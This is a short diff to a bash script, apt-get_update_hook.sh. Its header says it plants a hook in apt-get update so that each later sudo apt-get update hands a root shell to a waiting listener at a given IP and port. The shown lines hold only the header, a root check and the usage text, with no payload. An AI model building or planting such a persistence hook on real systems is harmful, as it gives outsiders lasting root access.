@@ -1,5 +1,13 @@
 #/bin/bash
 
+#########################################################################################################################  
+# apt-get_update_hook.sh                                                                                                #
+# Gain persistence through apt-get update                                                                               #
+# Every time user tries sudo apt-get update command we gain root access if we set a listener first                      #
+# an alternative to /metasploit-framework/blob/master/modules/exploits/linux/local/apt_package_manager_persistence.rb   #
+# by 0bfxgh0st*                                                                                                         #
+#########################################################################################################################
+
 if [[ $(id -u) != 0 ]]
 then
 	printf "%s\n" "Run this program as sudo user"
@@ -9,7 +17,7 @@ fi
 
 function _help_(){
 
-	printf "usage sudo bash apt-get_update_hook.sh <ip> <port>\n"
+	printf "%s\n" "usage sudo bash apt-get_update_hook.sh <ip> <port>"
 	exit
 }
 
